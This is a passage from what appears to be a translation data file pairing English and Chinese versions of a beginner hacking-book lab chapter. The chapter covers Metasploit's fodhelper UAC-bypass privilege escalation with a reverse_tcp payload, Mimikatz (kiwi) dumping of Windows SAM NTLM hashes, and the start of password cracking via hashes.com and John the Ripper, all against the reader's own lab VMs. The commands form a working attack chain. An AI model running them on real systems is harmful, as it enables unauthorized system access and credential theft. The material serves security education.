    \ Then, you’ll use one of Kali’s many password-cracking tools, `John the Ripper`,\
    \ to crack more of the hashes. You’ll start with a password dictionary attack\
    \ for the easier passwords, and you’ll finish with a mask attack.\n\n### Free\
    \ Online Password Databases\n\nHashes.com is a web service that allows you to\
    \ search for passwords in a database of *billions* of previously cracked hashes.\
    \ Every time you hash a particular password, you get the same hash, so the database\
    \ can store each password with its hash. When you search for a hash, the database\
    \ returns the unencrypted password (if that password is in the database).\n\n\
    1. In your Kali VM, open the Firefox browser and go to [https://hashes.com/decrypt/hash/](https://hashes.com/decrypt/hash/).\n\
    \n2. Paste the usernames and password hashes from your `Windows_hashes.txt` file\
    \ into the Hashes text box. Then remove the usernames so that only the hashes\
    \ appear in the box, as shown in [Figure 7-2](#c07.xhtml#figure7-2).\n"
  trans: "\n我们将使用 Metasploit 对 Windows `fodhelper` 漏洞的利用来获取系统级访问权限。Windows 使用一个名为\
    \ `fodhelper.exe` 的程序（`fod` 是 “features on demand” 的缩写）来管理区域设置，例如您所选语言的键盘布局。由于该应用程序以更高权限运行，以便在多个应用程序（如您的网页浏览器、文字处理器和桌面）中更改语言设置，因此它是黑客的一个良好目标。\n\
    \n1. 在你的 Kali VM 中，确保你处于 `msf6` 命令提示符下，而不是与 Meterpreter 会话交互。如果看到 `meterpreter\
    \ >` 命令提示符，输入 `background` 返回到常规的 `msf6` 命令提示符：\n```\nmeterpreter > background[*]\
    \ Backgrounding session 1...\nmsf6 exploit(multi/handler) >\n```\n2. 从 `msf6`\
    \ 提示符输入以下用粗体显示的五个命令：\n```\nmsf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp\n\
    PAYLOAD => windows/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) > use\
    \ exploit/windows/local/bypassuac_fodhelper\n[*] Using configured payload windows/meterpreter/reverse_tcp\n\
    msf6 exploit(windows/local/bypassuac_fodhelper) > set SESSION 1\nSESSION => X\n\
    msf6 exploit(windows/local/bypassuac_fodhelper) > set LHOST 10.0.9.x\nLHOST =>\
    \ 10.0.9.x\nmsf6 exploit(windows/local/bypassuac_fodhelper) > exploit\n```\n将\
    \ `set` `SESSION` 命令更改为与你的会话编号相匹配（如果不是 1），并将 `LHOST` IP 地址更改为与你的 Kali 机器相匹配。\n\
    \n3. 最后一条命令 `exploit` 可能需要尝试几次。如果收到 `no` `session` `was` `created` 的消息，请使用上箭头并按回车重新运行\
    \ `exploit` 命令。当它成功时，你会看到 `Meterpreter` `session` `2` `opened`，这意味着利用已打开第二个会话。你的命令提示符将改回\
    \ `meterpreter >`，表示你正在与新的 Meterpreter 会话交互。\n\n权限提升是你在这本书中执行的最高级别、最具技术挑战性的攻击，可能需要多次尝试。如果持续看到“no\
    \ session created”消息，请检查你的 Windows 10 VM，确保 Windows Defender 的 病毒和威胁防护 设置仍处于关闭状态。如果仍然卡住，请尝试从头重新运行此攻击。而且，在未来五年内，Windows\
    \ 很可能会修复 `fodhelper` 漏洞，你将不得不尝试不同的利用。有关更新，请查看本书网站 at [`www.nostarch.com/go-hck-yourself/`](https://www.nostarch.com/go-hck-yourself/)\
    \ for updates or do a web search for “Metasploit privilege escalation” on the\
    \ latest version of Windows.\n\n4. 在 Meterpreter 中输入 `getsystem` 以获取对 Windows\
    \ 10 VM 的系统级访问权限：\n```\nmeterpreter > getsystem\n...got system via technique 1\
    \ (Named Pipe Impersonation (In Memory/Admin)).\n```\n5. 通过输入 `getuid` 检查你是否已获得系统级访问权限：\n\
    ```\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\n```\nMeterpreter\
    \ 将回复你的用户 ID 为 `NT AUTHORITY\\System`，表示你现在已具有系统级访问权限。\n\n## 使用 Mimikatz 窃取密码哈希\n\
    \n现在我们拥有了系统级权限，可以准备窃取密码哈希了。我们将使用 Mimikatz，这是一款可以从多个位置访问 Windows 密码的黑客工具，包括直接从计算机运行时内存中访问。Metasploit\
    \ 中的 Mimikatz 模块名为 `kiwi`（编写 Mimikatz 的新西兰人 Benjamin Delpy 自称 Gentil Kiwi）。\n\n\
    1. 在 Meterpreter 提示符下输入 `use` `kiwi` 以加载 Mimikatz 工具：\n```\nmeterpreter > use\
    \ kiwi\n```\n2. Mimikatz 启动屏幕将出现在你的 Meterpreter 控制台中。现在我们可以转储 Windows 10 VM 中所有用户的密码哈希，如下所示：\n\
    ```\nmeterpreter > lsa_dump_sam\n```\n3. Mimikatz 将通过列出它能找到的所有用户和 Windows 密码哈希来作出回应：\n\
    ```\n[+] Running as SYSTEM\n[*] Dumping SAM--snip--\nRID  : 000003f0 (1008)\n\
    User : peter  Hash NTLM: e262404bfe47aa34ba668187b4209380\nRID  : 000003f1 (1009)\n\
    User : bryson Hash NTLM: 0a2b1c4f5d7ad37f9e2df24ff3ab4c48 \n```\n这些密码哈希使用 `New\
    \ Technology LAN Manager (NTLM) format`，这是 Windows 计算机存储登录信息（包括密码哈希）的方式之一。我们在破解密码时稍后会选择这种类型的密码哈希。\n\
    \n4. 为了破解密码哈希，我们需要将它们收集到一个文本文档中。突出显示用户名和 NTLM 哈希，右键单击所选内容并选择 `Copy`（你不能在 Metasploit\
    \ 控制台中使用 `ctrl-C` 复制；那是在终端窗口中退出或关闭正在运行进程的命令）。\n\n5. 通过单击 Kali 菜单按钮并选择 `Favorites`▶`Text\
    \ Editor` 打开 Mousepad 文本编辑器。按 `ctrl-V` 将你从 Meterpreter 复制的文本粘贴到 Mousepad 中。\n\n\
    6. 单击 `File`▶`New` 打开第二个 Mousepad 窗口。将用户名和密码哈希仅复制并粘贴到此新文档中，格式为 `username:hash`，每行一个用户名和哈希值，以冒号分隔，如\
    \ 图 7-1 所示。确保没有多余的空格。\n\n![图 7-1：复制并粘贴用户名和 NTLM 哈希值到新的文本文件](img/f07001.png)\n\
    图 7-1：复制并粘贴用户名和 NTLM 哈希值到新的文本文件\n\n跳过没有哈希值的任何用户或 Windows 创建的任何账户，如 `sshd`、`Guest`\
    \ 和 `DefaultAccount`。你只关心真实的用户和管理员账户，如 `IEUser`、`Administrator`，以及本章前面创建的用户账户。\n\
    \n7. 将文件保存为 `Windows_hashes.txt` 到你的 `Documents` 文件夹中。\n\n## 破解密码\n\n现在我们已经有了从\
    \ Windows VM 窃取的用户名和密码哈希文档，可以开始破解密码了。黑客采用几种不同的密码破解方法。*字典攻击* 使用常见密码列表，对每个密码进行哈希以查看是否与你要破解的哈希匹配。字典攻击速度快，但只对相对简单的密码有帮助。*暴力攻击*\
    \ 系统地尝试每一种字符组合，以找到长度一定的甚至高度复杂的密码。这使得暴力攻击非常彻底，但速度极慢。*掩码攻击* 是一种特殊的暴力攻击，我们在知道密码的一部分并且只需要对几个字符进行暴力破解时使用它。\n\
    \n我们将尝试几种密码破解方法。正如你将看到的，互联网和 Kali Linux 拥有使破解密码变得轻松的资源。首先，你将搜索一个免费的在线密码数据库来破解常见的密码哈希。然后，你将使用\
    \ Kali 的众多密码破解工具之一 `John the Ripper` 来破解更多哈希。你将从对较易密码的密码字典攻击开始，最后进行掩码攻击。\n\n###\
    \ 免费在线密码数据库\n\nHashes.com 是一个网络服务，允许你在包含 *数十亿* 个先前破解哈希的数据库中搜索密码。每次对特定密码进行哈希时，你都会得到相同的哈希，因此数据库可以存储每个密码及其哈希。当你搜索一个哈希时，数据库会返回未加密的密码（如果该密码在数据库中）。\n\
    \n1. 在你的 Kali VM 中，打开 Firefox 浏览器并访问 [`hashes.com/decrypt/hash/`](https://hashes.com/decrypt/hash/)。\n\
    \n2. 将 `Windows_hashes.txt` 文件中的用户名和密码哈希粘贴到 Hashes 文本框中。然后删除用户名，使文本框中仅显示哈希，如 图\
    \ 7-2 所示。\n"
